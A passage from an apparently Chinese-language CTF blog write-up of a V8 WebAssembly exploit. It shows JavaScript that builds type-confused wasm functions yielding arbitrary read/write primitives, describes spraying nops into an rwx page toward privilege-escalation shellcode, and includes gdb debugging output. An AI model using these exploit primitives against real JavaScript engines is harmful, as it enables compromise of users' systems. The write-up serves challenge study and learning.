style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-js language-js"><span style="color:#CB7676">const</span><span style="color:#BD976A"> refStructType</span><span style="color:#666666"> =</span><span style="color:#80A665"> wasmRefType</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">structType</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><span style="color:#758575DD">  // ref struct(i64)</span><br><br><span style="color:#758575DD">// from_i64: (i64) -> ref struct(i64)</span><br><span style="color:#CB7676">const</span><span style="color:#BD976A"> sig_cast</span><span style="color:#666666"> =</span><span style="color:#80A665"> makeSig</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><span style="color:#BD976A">kWasmI64</span><span style="color:#4d9375">]</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#4d9375">[</span><span style="color:#BD976A">refStructType</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">const</span><span style="color:#BD976A"> cast</span><span style="color:#666666"> =</span><span style="color:#BD976A"> builder</span><span style="color:#666666">.</span><span style="color:#80A665">addFunction</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">from_i64</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#BD976A"> sig_cast</span><span style="color:#5eaab5">)</span><br><span style="color:#666666">  .</span><span style="color:#80A665">addBodyWithEnd</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><br><span style="color:#BD976A">    kExprLocalGet</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><br><span style="color:#BD976A">    kExprEnd</span><span style="color:#666666">,</span><br><span style="color:#666666">  </span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><br><span style="color:#CB7676">const</span><span style="color:#BD976A"> sig_set</span><span style="color:#666666"> =</span><span style="color:#80A665"> makeSig</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><span style="color:#BD976A">kWasmI64</span><span style="color:#666666">,</span><span style="color:#BD976A"> kWasmI64</span><span style="color:#4d9375">]</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#4d9375">[</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#BD976A">builder</span><span style="color:#666666">.</span><span style="color:#80A665">addFunction</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">set_field</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#BD976A"> sig_set</span><span style="color:#5eaab5">)</span><br><span style="color:#666666">  .</span><span style="color:#80A665">addBodyWithEnd</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><br><span style="color:#BD976A">    kExprLocalGet</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><br><span style="color:#BD976A">    kExprCallFunction</span><span style="color:#666666">,</span><span style="color:#666666"> ...</span><span style="color:#80A665">wasmUnsignedLeb</span><span style="color:#d4976c">(</span><span style="color:#BD976A">cast</span><span style="color:#666666">.</span><span style="color:#BD976A">index</span><span style="color:#666666">,</span><span style="color:#BD976A"> kMaxVarInt32Size</span><span style="color:#d4976c">)</span><span style="color:#666666">,</span><br><span style="color:#BD976A">    kExprLocalGet</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><br><span style="color:#BD976A">    kGCPrefix</span><span style="color:#666666">,</span><span style="color:#BD976A"> kExprStructSet</span><span style="color:#666666">,</span><br><span style="color:#666666">    ...</span><span style="color:#80A665">wasmUnsignedLeb</span><span style="color:#d4976c">(</span><span style="color:#BD976A">structType</span><span style="color:#666666">,</span><span style="color:#BD976A"> kMaxVarInt32Size</span><span style="color:#d4976c">)</span><span style="color:#666666">,</span><br><span style="color:#666666">    ...</span><span style="color:#80A665">wasmUnsignedLeb</span><span style="color:#d4976c">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#BD976A"> kMaxVarInt32Size</span><span style="color:#d4976c">)</span><span style="color:#666666">,</span><br><span style="color:#BD976A">    kExprEnd</span><span style="color:#666666">,</span><br><span style="color:#666666">  </span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><span style="color:#666666">  .</span><span style="color:#80A665">exportFunc</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><br><span style="color:#CB7676">const</span><span style="color:#BD976A"> sig_get</span><span style="color:#666666"> =</span><span style="color:#80A665"> makeSig</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><span style="color:#BD976A">kWasmI64</span><span style="color:#4d9375">]</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#4d9375">[</span><span style="color:#BD976A">kWasmI64</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#BD976A">builder</span><span style="color:#666666">.</span><span style="color:#80A665">addFunction</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">get_field</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#BD976A"> sig_get</span><span style="color:#5eaab5">)</span><br><span style="color:#666666">  .</span><span style="color:#80A665">addBodyWithEnd</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><br><span style="color:#BD976A">    kExprLocalGet</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><br><span style="color:#BD976A">    kExprCallFunction</span><span style="color:#666666">,</span><span style="color:#666666"> ...</span><span style="color:#80A665">wasmUnsignedLeb</span><span style="color:#d4976c">(</span><span style="color:#BD976A">cast</span><span style="color:#666666">.</span><span style="color:#BD976A">index</span><span style="color:#666666">,</span><span style="color:#BD976A"> kMaxVarInt32Size</span><span style="color:#d4976c">)</span><span style="color:#666666">,</span><br><span style="color:#BD976A">    kGCPrefix</span><span style="color:#666666">,</span><span style="color:#BD976A"> kExprStructGet</span><span style="color:#666666">,</span><br><span style="color:#666666">    ...</span><span style="color:#80A665">wasmUnsignedLeb</span><span style="color:#d4976c">(</span><span style="color:#BD976A">structType</span><span style="color:#666666">,</span><span style="color:#BD976A"> kMaxVarInt32Size</span><span style="color:#d4976c">)</span><span style="color:#666666">,</span><br><span style="color:#666666">    ...</span><span style="color:#80A665">wasmUnsignedLeb</span><span style="color:#d4976c">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#BD976A"> kMaxVarInt32Size</span><span style="color:#d4976c">)</span><span style="color:#666666">,</span><br><span style="color:#BD976A">    kExprEnd</span><span style="color:#666666">,</span><br><span style="color:#666666">  </span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><span style="color:#666666">  .</span><span style="color:#80A665">exportFunc</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><br><span style="color:#CB7676">const</span><span style="color:#BD976A"> module_bytes</span><span style="color:#666666"> =</span><span style="color:#BD976A"> builder</span><span style="color:#666666">.</span><span style="color:#80A665">toBuffer</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">const</span><span style="color:#BD976A"> mod</span><span style="color:#666666"> =</span><span style="color:#CB7676"> new</span><span style="color:#BD976A"> WebAssembly</span><span style="color:#666666">.</span><span style="color:#80A665">Module</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">module_bytes</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">const</span><span style="color:#BD976A"> instance</span><span style="color:#666666"> =</span><span style="color:#CB7676"> new</span><span style="color:#BD976A"> WebAssembly</span><span style="color:#666666">.</span><span style="color:#80A665">Instance</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">mod</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><span style="color:#4d9375">}</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><br><span style="color:#CB7676">function</span><span style="color:#80A665"> read64</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">addr</span><span style="color:#5eaab5">)</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#758575DD">  // 这里 -8n 的原因可以调试发现</span><br><span style="color:#4D9375">  return</span><span style="color:#BD976A"> instance</span><span style="color:#666666">.</span><span style="color:#BD976A">exports</span><span style="color:#666666">.</span><span style="color:#80A665">get_field</span><span style="color:#4d9375">(</span><span style="color:#BD976A">addr</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91"> 8</span><span style="color:#CB7676">n</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 1</span><span style="color:#CB7676">n</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> </span><br><span style="color:#5eaab5">}</span><br><span style="color:#CB7676">function</span><span style="color:#80A665"> write64</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">addr</span><span style="color:#666666">,</span><span style="color:#BD976A"> value</span><span style="color:#5eaab5">)</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#BD976A">  instance</span><span style="color:#666666">.</span><span style="color:#BD976A">exports</span><span style="color:#666666">.</span><span style="color:#80A665">set_field</span><span style="color:#4d9375">(</span><span style="color:#BD976A">addr</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 1</span><span style="color:#CB7676">n</span><span style="color:#666666">,</span><span style="color:#BD976A"> value</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br></code></pre></div>
<p>由于已知栈地址，可以比较容易的在 wasm 栈地址上找到含有 rwx 段的地址，然后通过任意地址读写在 rwx 段写大量的 <code class="inline-code">nop</code> 最终滑到提权的 shellcode。</p>
<p>调试时可以启用 <code class="inline-code">--print-wasm-code</code> 参数，例如查看以下信息：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-text">--- WebAssembly code ---
name: get_field
index: 2
kind: wasm function
compiler: Liftoff
Body (size = 128 = 116 + 12 padding)
Instructions (size = 100, 0x39b37ae659c0-0x39b37ae65a24)
--- End code ---
</code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-text">--- WebAssembly code ---
name: get_field
index: 2
kind: wasm function
compiler: Liftoff
Body (size = 128 = 116 + 12 padding)
Instructions (size = 100, 0x39b37ae659c0-0x39b37ae65a24)
--- End code ---
</code></pre></div>
<p>然后用 gdb 查看这段 wasm 函数的汇编：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-text">0x39b37ae659cb:      sub    rsp,0x18
0x39b37ae659d2:      cmp    rsp,QWORD PTR [r13-0x60]
0x39b37ae659d6:      jbe    0x39b37ae65a0c
0x39b37ae659dc:      mov    rcx,QWORD PTR [rbp-0x18]
0x39b37ae659e0:      add    DWORD PTR [rcx+0xb],0x2
0x39b37ae659e4:      mov    QWORD PTR [rbp-0x28],rax
0x39b37ae659e8:      call   0x39b37ae65000              
0x39b37ae659ed:      mov    rcx,QWORD PTR [rax+0x7]     // 一般来讲断在第一个 call 之后
0x39b37ae659f1:      mov    r10,QWORD PTR [rbp-0x10]
0x39b37ae659f5:      mov    r10,QWORD PTR [r10+0x3f]
0x39b37ae659f9:      sub    DWORD PTR [r10+0x8],0x6d
0x39b37ae659fe:      js     0x39b37ae65a19
0x39b37ae65a04:      mov    rax,rcx
0x39b37ae65a07:      mov    rsp,rbp
0x39b37ae65a0a:      pop    rbp
0x39b37ae65a0b:      ret
</code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-text">0x39b37ae659cb:      sub    rsp,0x18
0x39b37ae659d2:      cmp    rsp,QWORD PTR [r13-0x60]
0x39b37ae659d6:      jbe    0x39b37ae65a0c
0x39b37ae659dc:      mov    rcx,QWORD PTR [rbp-0x18]
0x39b37ae659e0:      add    DWORD PTR [rcx+0xb],0x2
0x39b37ae659e4:      mov    QWORD PTR [rbp-0x28],rax
0x39b37ae659e8:      call   0x39b37ae65000              
0x39b37ae659ed:      mov    rcx,QWORD PTR [rax+0x7]     // 一般来讲断在第一个 call 之后
0x39b37ae659f1:      mov    r10,QWORD PTR [rbp-0x10]
0x39b37ae659f5:      mov    r10,QWORD PTR [r10+0x3f]
0x39b37ae659f9:      sub    DWORD PTR [r10+0x8],0x6d
0x39b37ae659fe:      js     0x39b37ae65a19
0x39b37ae65a04:      mov    rax,rcx
0x39b37ae65a07:      mov    rsp,rbp
0x39b37ae65a0a:      pop    rbp
0x39b37ae65a0b:      ret
</code></pre></div>
<p>在这个地方断点去查看当前 wasm 的栈风水是比较准确的。</p>
<p>完整 <a href="./exp.js" title="./exp.js">exp</a></p>
<p>另外远程没有开 pkey protection，本地测试时可以用 <code class="inline-code">--no-memory-protection-keys</code> 参数关闭保护。</p></div></div></div><footer class="footer"><div class="footer-row footer-links"><span class="footer-label">保持联系</span><a href="mailto:xzy1476569428@163.com" class="footer-link"><p><a href="mailto:xzy1476569428@163.com" title="mailto:xzy1476569428@163.com">xzy1476569428@163.com</a></p></a><span aria-hidden="true" class="footer-separator">·</span><a href="/rss.xml" class="footer-link">RSS</a><span aria-hidden="true" class="footer-separator">·</span><a href="https://github.com/LittFlower/my_blog" class="footer-link"><p>GitHub</p></a></div><div class="footer-row footer-meta"><span><p>本站基于
<a href="https://github.com/unvariant/blog">unvariant/blog</a>
改造，除特别说明外内容以 CC BY 4.0 协议共享。</p></span></div></footer></body></html>